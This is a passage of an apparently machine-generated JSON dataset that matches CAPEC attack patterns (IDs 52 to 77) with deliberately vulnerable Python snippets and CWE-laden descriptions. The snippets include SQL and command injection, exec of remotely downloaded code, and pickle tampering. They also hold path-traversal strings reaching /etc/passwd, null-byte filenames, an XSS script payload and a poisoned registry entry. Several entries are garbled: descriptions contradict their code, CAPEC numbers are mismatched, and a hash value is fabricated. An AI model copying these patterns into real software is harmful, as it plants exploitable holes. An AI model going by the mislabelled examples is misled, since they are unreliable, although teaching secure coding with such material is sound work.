        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulate a poisoned registry entry\npoisoned_registry_entry = '''\n<service>\n    <name>ExampleService</name>\n    <endpoint>http://malicious.example.com</endpoint>\n    <wsdl>http://malicious.example.com/service?wsdl</wsdl>\n</service>\n'''\n\n# Parse the poisoned registry entry\nroot = ET.fromstring(poisoned_registry_entry)\n\n# Extract and print the endpoint and WSDL URL\nendpoint = root.find('endpoint').text\nwsdl_url = root.find('wsdl').text\n\nprint(f\"Service Endpoint: {endpoint}\")\nprint(f\"WSDL URL: {wsdl_url}\")\n\n# Simulate storing sensitive information in cleartext\nregistry = {}\nregistry['ExampleService'] = {\n    'endpoint': endpoint,\n    'wsdl': wsdl_url,\n    'api_key': 'sensitive_api_key_in_cleartext'\n}\n\n# Print the registry to show cleartext storage\nprint(\"Registry:\", registry)\n",
        "description": "This Python code snippet demonstrates a poisoned web service registry entry, which is a key concept in the CAPEC 'Poison Web Service Registry'. The code creates a malicious registry entry with a fake service endpoint and WSDL URL. It then parses this entry and stores it in a registry dictionary, including sensitive information (an API key) in cleartext. This example highlights several related CWEs: improper authorization (CWE-285) by not validating the registry entry, injection (CWE-74) by allowing untrusted input, protection mechanism failure (CWE-693) by not securing the registry, and cleartext storage in the registry (CWE-314). The exposure of the WSDL file (CWE-651) is also demonstrated by including the WSDL URL in the poisoned entry."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import os\n\ndef is_valid_filename(filename):\n    # Improper Input Validation (CWE-20)\n    if '\\x00' in filename:\n        return False\n    return True\n\n\ndef read_file(filename):\n    if not is_valid_filename(filename):\n        raise ValueError('Invalid filename')\n\n    # Attempt to open the file (CWE-158)\n    with open(filename, 'r') as file:\n        return file.read()\n\n# Example usage\ntry:\n    data = read_file('example.txt\\x00.png')  # Embedding NULL Byte (CAPEC-137)\n    print(data)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to embedding NULL bytes (CAPEC-137). The `is_valid_filename` function attempts to validate the filename by checking for the presence of a NULL byte (CWE-20). However, the `read_file` function does not properly handle the NULL byte, leading to potential security issues (CWE-158). If an attacker provides a filename with an embedded NULL byte, the `open` function may interpret the filename incorrectly, potentially leading to unintended behavior or security vulnerabilities. This code highlights the importance of proper input validation and neutralization of special elements to prevent such attacks."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import os\n\ndef is_valid_path(path):\n    # Check if the path ends with a slash\n    if path.endswith('/'):\n        return True\n    return False\n\n# User input\nuser_input = input('Enter the directory path: ')\n\n# Vulnerable code: improper handling of null byte\nif is_valid_path(user_input):\n    # Attempt to create a directory\n    os.makedirs(user_input)\n    print('Directory created successfully!')\nelse:\n    print('Invalid directory path!')\n\n# Example of malicious input: 'valid_path/\\x00/evil'\n# This input bypasses the check and creates a directory 'valid_path/'",
        "description": "This Python code snippet demonstrates a vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The function `is_valid_path` checks if a given path ends with a slash. However, it does not properly handle null bytes (\\x00) within the input string. An attacker can exploit this by providing an input like 'valid_path/\\x00/evil', which bypasses the check and creates a directory 'valid_path/'. This example highlights CWE-158 (Improper Neutralization of Null Byte), CWE-20 (Improper Input Validation), and CWE-707 (Improper Neutralization). The code fails to correctly validate and neutralize special characters, leading to potential security issues."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import sqlite3\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Database connection\nconn = sqlite3.connect('example.db', check_same_thread=False)\ncursor = conn.cursor()\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    try:\n        # Vulnerable SQL query\n        cursor.execute(f\"SELECT * FROM users WHERE name LIKE '%{query}%' \")\n        results = cursor.fetchall()\n        return jsonify(results)\n    except Exception as e:\n        # Exposing sensitive error message\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask and SQLite. The application has a '/search' endpoint that takes a 'query' parameter from the URL. The code constructs an SQL query using string interpolation, which is vulnerable to SQL Injection (CWE-89). Additionally, if an error occurs, the application returns the raw error message, potentially exposing sensitive information (CWE-209). The use of the GET method with sensitive query strings (CWE-598) and improper neutralization of special elements in the data query logic (CWE-943) are also demonstrated. This code embodies the main idea of CAPEC-166, where an adversary probes the application's structure by submitting modified queries to extract information beyond the expected set of queries."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import hashlib\n\n# Weak password hashing function\n# CWE-916: Use of Password Hash With Insufficient Computational Effort\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n\n# Simulated database of user passwords (hashed)\n# CWE-261: Weak Encoding for Password\nuser_db = {\n    'user1': hash_password('password123'),  # CWE-521: Weak Password Requirements\n    'user2': hash_password('123456'),       # CWE-521: Weak Password Requirements\n}\n\n# Function to simulate an attacker using a rainbow table\n# CAPEC: Rainbow Table Password Cracking\nrainbow_table = {\n    '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n    'e10adc3949ba59abbe56e057f20f883e': '123456'\n}\n\ndef crack_password(hash_value):\n    return rainbow_table.get(hash_value, None)\n\n# Simulate an attacker accessing the hashed passwords and cracking them\nfor user, hashed_password in user_db.items():\n    cracked_password = crack_password(hashed_password)\n    if cracked_password:\n        print(f\"Cracked password for {user}: {cracked_password}\")\n    else:\n        print(f\"Failed to crack password for {user}\")",
        "description": "This Python code snippet demonstrates a scenario where an attacker uses a rainbow table to crack weakly hashed passwords stored in a database. The `hash_password` function uses MD5, a weak hashing algorithm (CWE-916), to hash passwords. The `user_db` dictionary simulates a database with weak passwords (CWE-521) that are hashed using this weak algorithm (CWE-261). The `crack_password` function simulates the attacker's use of a rainbow table to find the original passwords from their hashes. The code iterates over the user database, attempting to crack each password using the rainbow table, and prints the results. This embodies the main idea of CAPEC: Rainbow Table Password Cracking."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import hashlib\n\n# Simulated client-side authentication check\nclass Client:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def authenticate(self):\n        # Client-side password hash check (vulnerable)\n        hashed_password = hashlib.sha256(self.password.encode()).hexdigest()\n        if self.username == 'admin' and hashed_password == '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc8a1e6a3e6e6e6e6e':\n            return True\n        return False\n\n# Simulated server-side logic\nclass Server:\n    def __init__(self):\n        self.authenticated_users = []\n\n    def login(self, client):\n        if client.authenticate():\n            self.authenticated_users.append(client.username)\n            return 'Login successful'\n        return 'Login failed'\n\n# Example usage\nclient = Client('admin', 'password123')\nserver = Server()\nprint(server.login(client))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of client-side authentication logic. The `Client` class performs the authentication check by hashing the password and comparing it to a hardcoded hash value. This approach is flawed because it relies on the client to enforce security, which can be easily bypassed or manipulated. The `Server` class then uses this potentially compromised authentication result to grant access. This example embodies the main idea of CAPEC-207, highlighting the risks of removing or short-circuiting guard logic, and is related to CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import requests\n\n# Vulnerable endpoint URL\nurl = 'http://example.com/api/userinfo'\n\n# Sensitive data included in the query string\nparams = {\n    'user_id': '12345',\n    'auth_token': 'sensitive_token'\n}\n\n# Making a GET request to the endpoint\nresponse = requests.get(url, params=params)\n\n# Print the response (potentially sensitive data)\nprint(response.text)",
        "description": "This Python code snippet demonstrates a REST API request that is vulnerable to several security weaknesses described in the CAPEC and related CWEs. The code makes a GET request to an API endpoint, including sensitive information (user_id and auth_token) in the query string. This embodies CWE-598 (Use of GET Request Method With Sensitive Query Strings), as sensitive data is exposed in the URL. Additionally, the code does not verify the identity of the actors at both ends of the communication channel (CWE-300), nor does it ensure proper authentication (CWE-287). The lack of protection mechanisms (CWE-693) and the potential for external control of critical state data (CWE-642) are also implied, as the sensitive data could be intercepted or manipulated by unauthorized actors once SSL is terminated."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated database\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive Data'},\n    'user': {'role': 'user', 'data': 'User Data'}\n}\n\n# Vulnerable endpoint\n@app.route('/data/<username>', methods=['GET', 'PUT', 'DELETE'])\ndef manage_data(username):\n    if username not in users:\n        return jsonify({'error': 'User not found'}), 404\n\n    if request.method == 'GET':\n        return jsonify({'data': users[username]['data']})\n    elif request.method == 'PUT':\n        users[username]['data'] = request.json.get('data', users[username]['data'])\n        return jsonify({'message': 'Data updated'})\n    elif request.method == 'DELETE':\n        del users[username]\n        return jsonify({'message': 'User deleted'})\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with a RESTful API that lacks proper access control mechanisms. The endpoint '/data/<username>' allows GET, PUT, and DELETE methods to be performed on user data without verifying the user's role or permissions. This vulnerability can lead to privilege elevation, where an unauthorized user can read, modify, or delete data they should not have access to. The code embodies the main idea of CAPEC-111 (Restful Privilege Elevation) and related CWEs, such as CWE-267 (Privilege Defined With Unsafe Actions), CWE-269 (Improper Privilege Management), CWE-650 (Trusting HTTP Permission Methods on the Server Side), and CWE-285 (Improper Authorization)."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\nimport string\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def generate_session_id(self):\n        # CWE-330: Use of Insufficiently Random Values\n        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))  # CWE-6: Insufficient Session-ID Length\n\n    def create_session(self, user_id):\n        session_id = self.generate_session_id()\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def get_user(self, session_id):\n        # CWE-346: Origin Validation Error\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        else:\n            return None\n\n# Example usage\nsession_manager = SessionManager()\nsession_id = session_manager.create_session('user123')\nprint(f'Session ID: {session_id}')\nuser = session_manager.get_user(session_id)\nprint(f'User: {user}')",
        "description": "This Python code snippet demonstrates a vulnerable session management system. The `SessionManager` class generates session IDs using a predictable and insufficiently random method (CWE-330) and uses a short session ID length (CWE-6). The `generate_session_id` method creates a session ID by randomly selecting characters from a set of letters and digits, but only generates a 6-character string, making it easier to predict. The `create_session` method assigns this session ID to a user, and the `get_user` method retrieves the user associated with a given session ID without proper validation (CWE-346). This setup can lead to session hijacking and spoofing attacks, as attackers can predict or guess session IDs and gain unauthorized access to user sessions."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import http.server\nimport socketserver\nimport hashlib\nimport time\n\n# Simulated session storage\nsessions = {}\n\nclass MyHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        session_id = self.headers.get('Cookie')\n        if session_id and session_id in sessions:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Welcome back!')\n        else:\n            new_session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()\n            sessions[new_session_id] = {'user': 'guest'}\n            self.send_response(200)\n            self.send_header('Set-Cookie', new_session_id)\n            self.end_headers()\n            self.wfile.write(b'New session created!')\n\nPORT = 8000\nwith socketserver.TCPServer(('', PORT), MyHandler) as httpd:\n    print('Serving at port', PORT)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a simple HTTP server that handles session management in a vulnerable way. The server creates a new session ID using a hash of the current time and stores it in a global dictionary. When a client makes a GET request, the server checks for a session ID in the 'Cookie' header. If the session ID exists and is valid, the server responds with a welcome message. Otherwise, it creates a new session and sends the session ID back to the client in a 'Set-Cookie' header. This code is vulnerable to session replay attacks (CAPEC-139) because it does not invalidate old session IDs (CWE-384) and does not use secure methods to handle session IDs, making it possible for an attacker to reuse a stolen session ID to gain unauthorized access (CWE-294, CWE-200)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "from flask import Flask, request, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    user = request.form['username']\n    password = request.form['password']\n    if authenticate(user, password):\n        session['user'] = user\n        # Vulnerable: Session ID is not regenerated after login\n        return 'Logged in successfully'\n    return 'Invalid credentials'\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' in session:\n        return f'Welcome {session['user']}'\n    return 'Please log in first'\n\ndef authenticate(username, password):\n    # Dummy authentication for demonstration\n    return username == 'admin' and password == 'password'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that is vulnerable to session fixation attacks. The main idea of the CAPEC (Session Fixation) is represented by the fact that the session identifier is not regenerated after the user successfully logs in. This allows an attacker to provide a session identifier to the victim, and once the victim logs in, the attacker can use the same session identifier to gain unauthorized access. The related CWEs are also reflected in the code: CWE-384 (Session Fixation) is directly represented, CWE-664 (Improper Control of a Resource Through its Lifetime) is shown by not regenerating the session ID, CWE-732 (Incorrect Permission Assignment for Critical Resource) is implied by the lack of proper session management, CWE-602 (Client-Side Enforcement of Server-Side Security) is hinted at by the reliance on client-side session handling, and CWE-1270 (Generation of Incorrect Security Tokens) is indirectly represented by the improper handling of session tokens."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    # Missing CSRF token verification (CWE-352)\n    amount = request.form['amount']\n    recipient = request.form['recipient']\n    # Missing authentication for critical function (CWE-306)\n    # Improper control of a resource through its lifetime (CWE-664)\n    # Incorrect permission assignment for critical resource (CWE-732)\n    # Sensitive cookie with improper SameSite attribute (CWE-1275)\n    response = make_response(f'Transferred {amount} to {recipient}')\n    response.set_cookie('session', 'user_session_token')  # No SameSite attribute\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application endpoint using the Flask framework. The '/transfer' route handles POST requests to transfer an amount to a recipient. The code lacks CSRF token verification (CWE-352), meaning it does not check if the request is intentionally made by the user. It also does not perform any authentication for this critical function (CWE-306), allowing unauthorized users to perform transfers. Additionally, the code does not properly control the resource throughout its lifetime (CWE-664) and assigns incorrect permissions to critical resources (CWE-732). Finally, the session cookie is set without the SameSite attribute (CWE-1275), making it vulnerable to CSRF attacks. This snippet embodies the main idea of Cross-Site Request Forgery (CAPEC-352) by demonstrating how an attacker could exploit these weaknesses to perform unauthorized actions on behalf of a user."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks. The application has a single route '/search' that takes a 'query' parameter from the URL. The 'query' parameter is directly embedded into the HTML response without any form of input validation or sanitization, making it susceptible to XSS attacks. An attacker could inject malicious scripts into the 'query' parameter, which would then be executed in the context of the user's browser. This example embodies the main idea of CAPEC-79 and related CWEs, such as improper neutralization of input during web page generation (CWE-79) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "from urllib.parse import unquote\nimport os\n\n# Simulated user input\nuser_input = '/restricted%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'\n\n# Decode the URL-encoded input\ndecoded_input = unquote(user_input)\n\n# Check if the decoded input is within the allowed directory\nallowed_directory = '/restricted/'\n\n# Vulnerable path check\nif decoded_input.startswith(allowed_directory):\n    # Simulate file access\n    file_path = os.path.join(allowed_directory, decoded_input[len(allowed_directory):])\n    print(f'Accessing file: {file_path}')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerability where URL encoding is used to bypass validation logic. The user input is URL-encoded to represent a path traversal attack. The `unquote` function decodes the URL-encoded input, which is then checked against an allowed directory. However, the check is performed on the decoded input without proper neutralization of special elements, allowing an attacker to access restricted files. This embodies the main idea of CAPEC-147 and highlights related CWEs such as improper handling of URL encoding (CWE-177), path traversal (CWE-22), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import requests\n\n# Downloading code without integrity check (CWE-494)\nurl = 'http://example.com/update.py'\nresponse = requests.get(url)\n\n# Cleartext transmission of sensitive information (CWE-319)\nif response.status_code == 200:\n    exec(response.text)  # Executing downloaded code without verification\nelse:\n    print('Failed to download the update.')",
        "description": "This Python code snippet demonstrates a scenario where an application downloads and executes code from a remote server without performing any integrity checks (CWE-494). The code is transmitted in cleartext (CWE-319), making it susceptible to sniffing attacks. An adversary could intercept the communication, capture the code, and potentially modify it to exploit the trust relationship between the client and server. This embodies the main idea of the CAPEC 'Sniff Application Code', highlighting the risks associated with cleartext transmission and lack of integrity verification."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# User input\nuser_id = input('Enter user ID: ')\n\n# Vulnerable SQL query construction\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\ntry:\n    # Execute the query\n    cursor.execute(query)\n    results = cursor.fetchall()\n    for row in results:\n        print(row)\nexcept sqlite3.Error as e:\n    # Error message containing sensitive information\n    print(f\"An error occurred: {e}\")\n\n# Close the cursor and connection\ncursor.close()\nconn.close()",
        "description": "This Python code snippet demonstrates a basic example of SQL Injection vulnerability. The code connects to an SQLite database and constructs an SQL query using user input without proper validation or neutralization of special characters. This allows an attacker to manipulate the SQL query by entering malicious input. Additionally, the code generates an error message that may contain sensitive information about the database, which can be exploited further. The code also highlights the importance of properly closing database cursors to prevent 'dangling' cursors that could be accessed by other users."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import syslog\n\ndef log_message(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    syslog.syslog(user_input)\n\nif __name__ == '__main__':\n    user_input = input('Enter log message: ')\n    log_message(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerable use of the syslog() function, which is the main idea of the CAPEC 'String Format Overflow in syslog()'. The function log_message() takes user input and directly passes it to syslog.syslog() without any format string parameter or validation. This can lead to a format string injection attack (CWE-134), where an attacker can inject malicious format string commands. The code does not validate or sanitize the user input (CWE-20), making it susceptible to injection attacks (CWE-74). This example highlights the importance of proper input validation and the dangers of using externally-controlled format strings in logging functions."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\n\n# Weak hash function (CWE-328)\ndef generate_weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate missing cryptographic step (CWE-325)\ndef sign_code(data, private_key):\n    # Missing actual signing step, just returning the hash\n    return generate_weak_hash(data)\n\n# Simulate subverting code-signing facilities (CAPEC-243)\ndef verify_code_signature(data, signature, public_key):\n    # Missing actual verification step, just comparing hashes\n    return generate_weak_hash(data) == signature\n\n# Example usage\ncode = \"print('Hello, world!')\"\nprivate_key = \"private_key_placeholder\"\npublic_key = \"public_key_placeholder\"\nsignature = sign_code(code, private_key)\n\n# Attacker can easily forge the signature due to weak hash and missing steps\nforged_signature = generate_weak_hash(code)\n\nprint(\"Original Signature:\", signature)\nprint(\"Forged Signature:\", forged_signature)\nprint(\"Verification Result:\", verify_code_signature(code, forged_signature, public_key))",
        "description": "This Python code snippet demonstrates a vulnerable code-signing mechanism that can be subverted, aligning with CAPEC-243. The code uses a weak hash function (MD5) to generate a hash of the code (CWE-328). The `sign_code` function simulates signing the code but omits critical cryptographic steps (CWE-325), merely returning the weak hash. The `verify_code_signature` function also skips proper verification steps, simply comparing hashes. This setup allows an attacker to forge a signature easily, demonstrating how subverting code-signing facilities can lead to privilege escalation or execution of untrusted code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\n\ndef run_command_with_privileges(command):\n    if os.geteuid() != 0:\n        raise PermissionError(\"This script must be run as root\")\n    os.system(command)\n\nuser_input = input(\"Enter the command to run: \")\nrun_command_with_privileges(user_input)\n",
        "description": "This Python code snippet demonstrates a program running with elevated privileges that executes a user-provided command. The function `run_command_with_privileges` checks if the script is being run as the root user (UID 0) and then executes the command using `os.system`. This code is vulnerable to CWE-78 (OS Command Injection) because it directly uses user input to construct and execute an OS command without proper sanitization. Additionally, it exemplifies CWE-250 (Execution with Unnecessary Privileges) as it requires root privileges to run, which can amplify the impact of any vulnerabilities. The code snippet embodies the main idea of the CAPEC by showing how an attacker could leverage a vulnerability in a privileged program to execute arbitrary commands with elevated privileges."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import getpass\n\n# Hard-coded credentials (CWE-798)\ndefault_username = 'admin'\ndefault_password = 'admin'\n\n# Weak password requirements (CWE-521)\ncommon_passwords = ['password', '123456', 'secret', 'admin']\n\n# Function to simulate login\ndef login(username, password):\n    if username == default_username and password == default_password:\n        return True\n    if password in common_passwords:\n        return True\n    return False\n\n# Simulate user login\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\nif login(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerable login system that embodies the main idea of CAPEC-111: 'Try Common or Default Usernames and Passwords'. The code includes hard-coded default credentials (CWE-798) and weak password requirements (CWE-521). The login function checks if the provided username and password match the default credentials or if the password is one of the common weak passwords. This represents a system that is susceptible to attacks using common or default credentials, highlighting the importance of strong password policies and the removal of default credentials."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        return False\n    \n    # Canonicalize the input (decode Unicode)\n    canonical_input = user_input.encode('utf-8').decode('unicode_escape')\n    \n    # Check for disallowed inputs (incomplete denylist)\n    disallowed_patterns = [r'<script>', r'\\u003Cscript\\u003E']\n    for pattern in disallowed_patterns:\n        if re.search(pattern, canonical_input):\n            return False\n    \n    return True\n\n# Example usage\nuser_input = \"\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E\"\nprint(is_valid_input(user_input))  # Expected to return False but may return True due to improper handling",
        "description": "This Python code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The function `is_valid_input` first performs early validation on the input before canonicalizing it, which is a common mistake (CWE-179, CWE-180). The input is then canonicalized by decoding Unicode escape sequences. The function checks for disallowed patterns using an incomplete denylist (CWE-184, CWE-692). This approach can be bypassed if the input contains Unicode-encoded malicious content that is not properly handled, allowing an attacker to inject harmful data (CWE-74, CWE-20). The example usage shows how an attacker could exploit this by providing a Unicode-encoded script tag that may not be detected by the validation logic."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import os\nfrom urllib.parse import unquote\n\ndef vulnerable_file_access(encoded_path):\n    # Decode the URL-encoded path\n    decoded_path = unquote(encoded_path)\n    \n    # Improper input validation\n    if '..' in decoded_path or decoded_path.startswith('/'):\n        raise ValueError('Invalid path')\n    \n    # External control of file name or path\n    with open(decoded_path, 'r') as file:\n        return file.read()\n\n# Example usage\nencoded_path = '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'\ntry:\n    content = vulnerable_file_access(encoded_path)\n    print(content)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to URL encoding and improper handling of file paths. The function `vulnerable_file_access` takes an URL-encoded file path as input, decodes it, and attempts to open the file. The code improperly validates the decoded path, allowing an attacker to use URL encoding to bypass the validation and access restricted files. This embodies the CAPEC's main idea of abusing URL encoding and highlights related CWEs such as improper handling of URL encoding (CWE-177), external control of file name or path (CWE-73), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import os\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    # Vulnerable to User-Controlled Filename attack\n    file.save(os.path.join('/uploads', filename))\n    return 'File uploaded successfully'\n\n@app.route('/view/<filename>')\ndef view_file(filename):\n    # Vulnerable to XSS attack\n    return render_template_string('<h1>Viewing file: {{ filename }}</h1>', filename=filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a web application using Flask that is vulnerable to a User-Controlled Filename attack. The '/upload' route allows users to upload files, but it does not validate or sanitize the filename, leading to potential security issues such as XSS attacks. The '/view/<filename>' route dynamically generates HTML content using the filename provided by the user, which can be exploited to execute malicious scripts in the client's browser. This code embodies the main idea of the CAPEC by showing how improper input validation and encoding can lead to security vulnerabilities."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import hashlib\nimport os\nimport pickle\n\n# Simulate user state stored in a cookie\nuser_state = {'username': 'user1', 'balance': 100}\ncookie = pickle.dumps(user_state)\n\n# Store cookie in cleartext (CWE-315)\nwith open('user_cookie.txt', 'wb') as f:\n    f.write(cookie)\n\n# Simulate an attacker modifying the state\nwith open('user_cookie.txt', 'rb') as f:\n    tampered_cookie = f.read()\n\n# Attacker modifies the balance\nattacker_state = pickle.loads(tampered_cookie)\nattacker_state['balance'] = 1000000\n\n# Save the tampered state back to the cookie\nwith open('user_cookie.txt', 'wb') as f:\n    f.write(pickle.dumps(attacker_state))\n\n# Application reads the tampered state (CWE-372)\nwith open('user_cookie.txt', 'rb') as f:\n    final_state = pickle.loads(f.read())\n\nprint(f\"Username: {final_state['username']}, Balance: {final_state['balance']}\")",
        "description": "This Python code snippet demonstrates the concept of 'Manipulating State' (CAPEC) by simulating a scenario where user state information is stored in a cookie and then tampered with by an attacker. The code stores user state in cleartext (CWE-315) and does not verify the integrity of the data (CWE-353), allowing an attacker to modify the state. The application then reads the tampered state, leading to incorrect operations (CWE-372). This example highlights the risks associated with improper state management and the importance of securing state information."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import os\n\n# Configuration file path\nconfig_file_path = 'config.txt'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to execute a command based on configuration\ndef execute_command(config):\n    # CWE-77: Command Injection vulnerability\n    os.system(config)\n\n# Main function\nif __name__ == '__main__':\n    # CWE-346: Origin Validation Error\n    # CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\n    config_data = read_config(config_file_path)\n    \n    # CWE-99: Improper Control of Resource Identifiers\n    # CWE-353: Missing Support for Integrity Check\n    # CWE-354: Improper Validation of Integrity Check Value\n    execute_command(config_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable application that reads a configuration file and executes a command based on its content. The configuration file is assumed to be writable and not properly secured, embodying the main idea of CAPEC-62: 'Manipulating Writeable Configuration Files'. The code includes several related CWEs:\n\n1. CWE-77: Command Injection - The `execute_command` function directly uses the configuration data to execute a system command without sanitization.\n2. CWE-346: Origin Validation Error - The source of the configuration data is not validated.\n3. CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data - The configuration data is read without distinguishing between trusted and untrusted data.\n4. CWE-99: Improper Control of Resource Identifiers - The configuration data is used as a resource identifier without proper restriction.\n5. CWE-353 and CWE-354: Missing and Improper Validation of Integrity Check - The integrity of the configuration data is not checked, allowing potential tampering.\n\nThis code highlights the risks associated with manipulating writable configuration files and the importance of validating and sanitizing input data to prevent security vulnerabilities."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import os\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\n\n@app.route('/download', methods=['GET'])\ndef download_file():\n    filename = request.args.get('file')\n    if not filename:\n        return 'No file specified', 400\n    try:\n        # Vulnerable to Path Traversal\n        file_path = os.path.join('/var/www/files', filename)\n        return send_file(file_path)\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that allows users to download files from a server. The main idea of the CAPEC is represented by the vulnerability in the `download_file` function, where user input is used to construct a file path without proper validation or neutralization. This can lead to a Path Traversal attack (CWE-22, CWE-23), where an attacker can manipulate the 'file' parameter to access files outside the intended directory. The code also touches on CWE-73 (External Control of File Name or Path) as the file path is directly influenced by user input. The lack of proper error handling and validation can lead to unauthorized access and potential modification of files on the server."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import os\n\n# Vulnerable code: User-controlled variable directly used without sanitization\nuser_input = os.getenv('DEBUG')\n\n# This could be a critical configuration setting\nif user_input == '1':\n    debug_mode = True\nelse:\n    debug_mode = False\n\nprint(f'Debug mode is set to: {debug_mode}')",
